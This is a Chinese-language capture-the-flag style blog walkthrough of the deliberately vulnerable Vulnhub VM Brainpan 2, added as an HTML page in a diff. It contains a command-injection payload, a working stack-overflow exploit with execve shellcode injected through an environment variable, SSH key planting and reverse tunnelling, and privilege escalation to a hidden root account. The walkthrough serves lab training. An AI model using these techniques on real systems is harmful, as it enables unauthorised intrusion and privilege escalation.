@@ -1,0 +1,575 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Brainpan 2 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Brainpan 2，依舊是Vulnhub的Vulnerable Machine，作者是superkojiman nmap掃描目標，一樣掃出9999和10000上有東西 Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-02 07:10 EST &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/03/07/brainpan2/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Brainpan 2</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-07T00:54:43+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:54 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/brainpan-1,51/">Brainpan 2</a>，依舊是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/superkojiman,43/">superkojiman</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>nmap掃描目標，一樣掃出9999和10000上有東西</p>
+
+<pre><code>Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-02 07:10 EST
+Nmap scan report for 192.168.2.156
+Host is up (0.000093s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port9999-TCP:V=6.46%I=7%D=1/2%Time=54A68AD6%P=x86_64-unknown-linux-gnu%
+SF:r(NULL,296,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
+SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
+SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
+SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
+SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
+SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
+SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
+SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
+SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
+SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
+SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
+SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20_\|\n\n\[______________________\x20WELCOME\x20TO\x20BRAINPAN
+SF:\x202\.0________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20LOGIN\x20AS\x20GUEST\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
+MAC Address: 00:0C:29:82:55:96 (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 166.40 seconds
+</code></pre>
+
+<p>9999看來又是架了一個brainpan.exe在上面，連上去瞧瞧</p>
+
+<pre><code>_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 2.0________________________]
+                             LOGIN AS GUEST
+
+                          &gt;&gt; shitstorm
+Never gonna give you up Never gonna let you down Never gonna run around and desert you
+</code></pre>
+
+<p>Brainpan升級成2.0了，而且還要求以GUEST的身分登入</p>
+
+<p>送了在Brainpan 1找到的&#8221;shitstorm&#8221;過去，送了一句歌詞回來後就被斷線了XD</p>
+
+<p>在繼續探究Brainpan 2.0之前，先來看一下10000 port上面是不是一樣能下載brainpan.exe</p>
+
+<p><img class="center" src="/images/2015-03-08-brainpan2/exe.png"></p>
+
+<p>brainpan.exe抓下來之後先用strings掃一下有沒有藏東西</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan2# strings brainpan.exe
+JFIF
+;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85
+</code></pre>
+
+<p>結果exe是個障眼法，實際上是一張jpg檔</p>
+
+<p><img class="center" src="/images/2015-03-08-brainpan2/brainpan.jpg"></p>
+
+<p>10000 port應該是沒甚麼好看的了，接下來繼續研究Brainpan 2.0</p>
+
+<p>用GUEST的身分登入後，使用提供的&#8221;TELL ME MORE&#8221;指令會秀出可以使用的指令</p>
+
+<pre><code>                          &gt;&gt; TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+</code></pre>
+
+<p>FILES=ls -al，VIEW=cat，CREATE可以建立一個新的檔案並且寫入內容</p>
+
+<pre><code>                          &gt;&gt; FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
+</code></pre>
+
+<p>本來突發奇想用CREATE去改brainpan.exe，再看能不能弄當brainpan.exe，等重啟的時候就會執行寫入的程式</p>
+
+<p>不過在用notes.txt當作實驗材料的時候就當掉重啟了，看來應該是不能去修改anansi權限以外的檔案</p>
+
+<p>接下來試試VIEW有沒有辦法作command injection</p>
+
+<pre><code>                          &gt;&gt; VIEW
+ENTER FILE TO DOWNLOAD: test-1;id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+</code></pre>
+
+<p>Command Injection成功了，再來先回攻擊端架好listen port，試試看能不能拿到reverse shell</p>
+
+<p><img class="center" src="/images/2015-03-08-brainpan2/shell.png"></p>
+
+<p>拿到anansi的shell之後，在/home/reynard找到一個有設定root sticky bit的檔案msg_root</p>
+
+<pre><code>ls -al /home/reynard/msg_root
+-rwsr-xr-x 1 root root 8999 Nov  6  2013 /home/reynard/msg_root
+</code></pre>
+
+<p>玩弄一下msg_root會發現他會把輸入的訊息記在/tmp/msg.txt，接著來試試看有沒有Buffer overflow的漏洞</p>
+
+<pre><code>anansi@brainpan2:~$ /home/reynard/msg_root AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;AAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+anansi@brainpan2:~$ gdb -q /home/reynard/msg_root
+gdb -q /home/reynard/msg_root
+Reading symbols from /home/reynard/msg_root...done.
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;AAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/reynard/msg_root AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+</code></pre>
+
+<p>成功把EIP指向了0x41414141(AAAA)，接下來找一下在第幾個byte可以修改EIP</p>
+
+<p>回到Kali Linux建立pattern</p>
+
+<pre><code>root@kali:/var/www# /usr/share/metasploit-framework/tools/pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</code></pre>
+
+<p>用gdb執行並送入參數</p>
+
+<pre><code>(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 123
+&lt;b4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 123
+Starting program: /home/reynard/msg_root Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 123
+
+Program received signal SIGSEGV, Segmentation fault.
+0x35614134 in ?? ()
+</code></pre>
+
+<p>再用0x35614134找出EIP的位置</p>
+
+<pre><code>root@kali:/var/www# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x35614134
+[*] Exact match at offset 14
+</code></pre>
+
+<p>要在只有14 byte的空間塞可以pop shell的shellcode是有困難的，之前有看過<a href="http://www.tenouk.com/Bufferoverflowc/bufferoverflowvulexploitdemo32.html">用環境變數傳入shellcode</a>的作法</p>
+
+<p>不過使用這個方法的前提是機器沒有開ASLR，先檢查一下ASLR的設定</p>
+
+<pre><code>anansi@brainpan2:~$ cat /proc/sys/kernel/randomize_va_space
+cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
+
+<p>ASLR是關閉的，再來是實作的部分。<a href="http://shell-storm.org/shellcode/files/shellcode-606.php">shellcode</a>使用在Brainpan 1用過的</p>
+
+<pre><code>anansi@brainpan2:~$ export EGG=`python -c 'print "\x90"*100+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
+anansi@brainpan2:~$ ./findeggaddr
+./findeggaddr
+EGG:bffffeed
+anansi@brainpan2:~$ /home/reynard/msg_root `python -c 'print "A"*14+"\xed\xfe\xff\xbf"'` 123
+&lt;eynard/msg_root `python -c 'print "A"*14+"\xed\xfe\xff\xbf"'` 123
+bash-4.2$ id
+id
+uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
+</code></pre>
+
+<p>拿到root了！可是uid不是0?去/root看一下有沒有flag之類的檔案</p>
+
+<pre><code>bash-4.2$ cat flag.txt
+cat flag.txt
+cat: flag.txt: Permission denied
+bash-4.2$ cat whatif.txt
+cat whatif.txt
+
+       WHAT IF I TOLD YOU
+              ___
+            /     \
+           | ______\
+          (, \_/ \_/
+           |   ._. |
+           \   --- /
+           /`-.__.'
+      .---'`-.___|\___
+     /                `.
+
+       YOU ARE NOT ROOT?
+</code></pre>
+
+<p>認命去看一下/etc/passwd</p>
+
+<pre><code>cat /etc/passwd
+root:x:104:106:root:/root:/bin/bash
+root :x:0:0:root:/var/root:/bin/bash
+</code></pre>
+
+<p>&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;</p>
+
+<p>&ldquo;root &#8220;，名字後面有個空格的才是正港的root，再找看看有沒有其他有設定sticky bit的程式</p>
+
+<pre><code>bash-4.2$ find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+/opt/old/brainpan-1.8/brainpan-1.8.exe
+bash-4.2$ ls -al /opt/old/brainpan-1.8/brainpan-1.8.exe
+ls -al /opt/old/brainpan-1.8/brainpan-1.8.exe
+-rwsr-xr-x 1 puck puck 17734 Nov  4  2013 /opt/old/brainpan-1.8/brainpan-1.8.exe
+</code></pre>
+
+<p>這次出現的是在/opt/brainpan/notes.txt出現過的brainpan-1.8，擁有者是puck</p>
+
+<p>直接執行brainpan-1.8.exe，會發現只剩下VIEW的功能，繼續試試看command injection的漏洞還在不在</p>
+
+<pre><code> &gt;&gt; VIEW
+ENTER FILE TO DOWNLOAD:  hi; id
++ read 8 bytes
+/bin/cat: hi: No such file or directory
+uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
+</code></pre>
+
+<p>看來這個漏洞一直都存在著，也確實以puck的身分在執行brainpan-1.8.exe</p>
+
+<p>在瀏覽的過程中，幾度因為手殘下了Ctrl+C把reverse shell給斷開</p>
+
+<p>一怒之下先來找看看有沒有ssh可以用Orz</p>
+
+<pre><code>cat /etc/ssh/sshd_config
+Port 2222
+ListenAddress 127.0.1.1
+anansi@brainpan2:~$ netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
+</code></pre>
+
+<p>看來ssh有架起來，不過因為不知道anansi的密碼，就必須先連回Kali，用reverse tunneling的方式從Kali接通brainpan2的ssh port</p>
+
+<pre><code>bash-4.2$ echo "ssh-rsa AAAAB3NzaC1y.......azvZoJx root@kali" &gt;&gt; authorized_keys
+bash-4.2$ ssh root@192.168.2.128 -R 23457:127.0.1.1:2222
+
+root@kali:~/.ssh# ssh anansi@localhost -p23457
+The authenticity of host '[localhost]:23457 ([::1]:23457)' can't be established.
+ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[localhost]:23457' (ECDSA) to the list of known hosts.
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  5 09:13:28 2013
+anansi@brainpan2:~$ 
+</code></pre>
+
+<p>既然ssh的線路已經架起來了，puck也用相同的方式就能用ssh連上囉</p>
+
+<pre><code>root@kali:~# ssh puck@localhost -p23457
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+puck@brainpan2:~$
+</code></pre>
+
+<p>在/home/puck的目錄下有個.backup目錄，裡面有個.bash_history，來看一下前人下過的指令</p>
+
+<pre><code>puck@brainpan2:~/.backup$ cat .bash_history
+cd /usr/local/bin
+ls -l
+./msg_root "comment on the latest version please"
+cd /opt/brainpan/
+ps aux
+vi brainpan-1.8.c
+cd ../archive
+netstat -antp
+netstat -antp | grep 9888
+cd ..
+ls
+cd old
+ls
+cd brainpan-1.8
+vi brainpan-1.8.c
+ssh -l "root " brainpan2
+vi brainpan.7
+man ./brainpan.7
+ls
+htop
+top
+ls -latr
+cat .bash_history
+ls
+mkdir .backup
+mv .ssh .bash* .backup
+cd .backup/
+ls
+clear
+ls -latr
+exit
+</code></pre>
+
+<p>有使用ssh登入&#8221;root &ldquo;的記錄，再下一次指令看能不能進去</p>
+
+<pre><code>puck@brainpan2:~/.backup$ ssh -l "root " brainpan2 -p2222
+The authenticity of host '[brainpan2]:2222 ([127.0.1.1]:2222)' can't be established.
+ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[brainpan2]:2222' (ECDSA) to the list of known hosts.
+root @brainpan2's password:
+</code></pre>
+
+<p>還是會跳出要求密碼的訊息。再看一下.backup的內容物，有個.ssh的目錄，而這個目錄裡面的rsa key跟/home/puck/.ssh裡面的rsa key是不一樣的，說不定拿這個去替換就可以了</p>
+
+<pre><code>puck@brainpan2:~/.ssh$ ssh -l "root " brainpan2 -p2222
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov  7 11:00:06 2013
+root @brainpan2:~# cat /root/flag.txt
+
+                          !!! CONGRATULATIONS !!!
+
+                 You've completed the Brainpan 2 challenge!
+                 Or have you...?
+
+                 Yes, you have! Pat yourself on the back. :-)
+
+                 Questions, comments, suggestions for new VM
+                 challenges? Let me know!
+
+
+                 Twitter: @superkojiman
+                 Email  : contact@techorganic.com
+                 Web    : http://www.techorganic.com
+</code></pre>
+
+<p>flag還要再嚇人一次</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-07T00:54:43+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:54 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/03/07/brainpan2/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/03/07/brainpan2/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/07/brainpan/" title="Previous Post: Brainpan 1">&laquo; Brainpan 1</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/03/12/pandora1_level1/" title="Next Post: Pandora's Box 1 - Level 1">Pandora&#8217;s Box 1 - Level 1 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
